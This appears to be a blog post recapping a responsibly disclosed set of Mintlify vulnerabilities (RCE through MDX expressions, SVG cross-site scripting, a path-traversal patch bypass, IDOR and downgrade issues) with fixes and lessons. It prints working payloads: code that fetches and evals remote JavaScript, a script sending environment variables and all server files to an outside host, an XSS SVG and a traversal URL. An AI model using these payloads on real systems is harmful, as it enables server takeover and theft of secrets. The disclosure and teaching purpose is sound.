---
title: "The Mintlify Supply Chain Attack"
description: "How Three Researchers Exposed Critical Vulnerabilities in Major Tech Companies"
draft: false
tags: ["CVE", "Bug Bounty"]
published: 2025-12-22
---

## Introduction

In late 2025, three security researchers **xyzeva**, **hackermon**, and **MDL** discovered a series of critical vulnerabilities in **Mintlify**, a popular documentation platform used by major tech companies. These vulnerabilities allowed for **remote code execution**, **cross-site scripting**, and other attacks that could have compromised the security of companies like **Discord**, **Twitter**, **Vercel**, and **Cursor**. This post explores what happened, why it happened, and **how the researchers uncovered these vulnerabilities**.

## The Target: Mintlify

Mintlify is a **B2B SaaS documentation platform** that allows companies to create and host documentation using **MDX files**. MDX is a combination of **Markdown** and **JSX**, enabling the inclusion of JavaScript expressions within Markdown files. Some of Mintlify's notable customers include:

- **Discord**
- **Twitter (X)**
- **Vercel**
- **Cursor**

## The RCE Vulnerability (CVE-2025-67843)

### Discovery

The first vulnerability discovered was a **Remote Code Execution (RCE)** flaw. The researcher, **xyzeva**, was curious about how Mintlify rendered MDX on the server-side for static page generation. They wondered if it was possible to execute arbitrary code by injecting JavaScript expressions into MDX files.

To test this, **xyzeva** created a simple payload:

```jsx
{
  !!fetch("https://attacker.kibty.town")
    .then((r) => r.text())
    .then((c) => eval(c));
}
```

After deploying this to Mintlify and visiting the page, they received a request from a **Vercel/Amazon IP**, confirming that the code was being executed on the server.

### Exploitation

With the confirmation that arbitrary code could be executed, **xyzeva** wrote a more sophisticated script to exfiltrate sensitive data:

```javascript
const exfil = (data) =>
  fetch("https://attacker.kibty.town", {
    method: "POST",
    body: JSON.stringify(data),
  });
exfil({ files: [{ name: ".env.json", content: JSON.stringify(process.env) }] });
try {
  import("fs").then(async (a) => {
    const arr = [];
    for (const filename of a.readdirSync(".", { recursive: true })) {
      if (a.lstatSync(filename).isDirectory()) continue;
      const content = a.readFileSync(filename, "utf-8");
      arr.push({ name: filename, content });
    }
    console.log(arr.length);
    await exfil({ files: arr });
    console.log("done exfiling");
  });
} catch (error) {
  exfil(error);
}
```

This script exfiltrated **environment variables** and **app files**, providing **full access** to the server-side environment.

### Impact

The RCE vulnerability allowed attackers to:

- Execute arbitrary code on the server
- Poison the Next.js cache for any site
- Perform mass XSS attacks on customer domains
- Conduct targeted XSS attacks on custom domains
- Launch DOS attacks on customer sites
- Trigger unauthorized PDF exports

## The Targeted XSS Vulnerability (CVE-2025-67842)

### Discovery

After finding the RCE, **xyzeva** noticed an interesting route: `/_mintlify/static/[subdomain]/{...path}`. This route allowed accessing static images from repositories. They wondered if it was possible to access assets from another organization.

To test this, **xyzeva** crafted a URL:

```
https://discord.com/_mintlify/static/evascoolcompany/xss.svg
```

The SVG file contained a simple XSS payload:

```xml
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(window.origin);"/>
```

When visiting this URL, the XSS payload executed, confirming the vulnerability.

### Impact

This vulnerability allowed:

- **One-click XSS** on users who clicked a link
- **Full exploitation** on companies that didn't properly scope cookies or had documentation on a subpath

## The Patch Bypass (CVE-2025-67845)

### Discovery

After Mintlify patched the targeted XSS, xyzeva examined the patch and found a bypass. The patch didn't properly handle **URL-encoded path traversal**.

To exploit this, **xyzeva** crafted a URL with path traversal:

```
https://discord.com/_mintlify/static/discord/images/create-team-owned-app.png%2F..%2F..%2F..%2Fevascoolcompany%2Fxss.svg
```

This bypassed the patch and allowed the XSS payload to execute again.

## Non-Critical Vulnerabilities

### GitHub IDOR (CVE-2025-67844)

Mintlify didn't validate the GitHub repository owner/name fields on their API, allowing users to set it to any authorized repository. This allowed viewing commit details for new commits.

### Downgrade Attack (CVE-2025-67846)

Mintlify used Vercel for deployments. A common pitfall is failing to remove previous vulnerable deployments, allowing attackers to target specific vulnerable deployment IDs, git branches, or refs.

## The Collaboration

The researchers **xyzeva**, **hackermon**, and **MDL** collaborated to find and disclose these vulnerabilities. They worked together to understand the full scope of the vulnerabilities and their impact on Mintlify's customers.

## The Patch

After the researchers disclosed the vulnerabilities to Mintlify, the company swiftly patched them. The patches included:

- **Not parsing non-simple MDX expressions on SSR** for the RCE vulnerability
- **Preventing access to Mintlify assets not on the same organization** for the targeted XSS vulnerability
- **Adding checks to prevent path traversal** for the patch bypass
- **Validating GitHub repository access** for the GitHub IDOR vulnerability
- **Adding visitor passwords on preview deployments and purging old vulnerable deployments** for the downgrade attack

## Lessons Learned

This incident highlights the importance of:

1. **Input Validation**: Always validate and sanitize user inputs to prevent code injection and other attacks.
2. **Access Control**: Implement proper access controls to prevent unauthorized access to resources.
3. **Patch Management**: Ensure that patches are thoroughly tested and that previous vulnerable deployments are removed.
4. **Collaboration**: Work with security researchers to understand and fix vulnerabilities.

## Conclusion

The Mintlify supply chain attack serves as a reminder of the importance of security in the software supply chain. By understanding how these vulnerabilities were discovered and exploited, we can better protect our systems and data from similar attacks.

## Credits and Sources

For more details, check out the original write-ups by the researchers:

- [How to Hack Discord, Vercel, and More with One Easy Trick](https://kibty.town/blog/mintlify/)
- [Hi, I'm Daniel. I'm a 16-year-old high school senior.](https://gist.github.com/hackermondev/5e2cdc32849405fff6b46957747a2d28)
- [Redacted by Counsel: A supply chain postmortem](https://heartbreak.ing/)
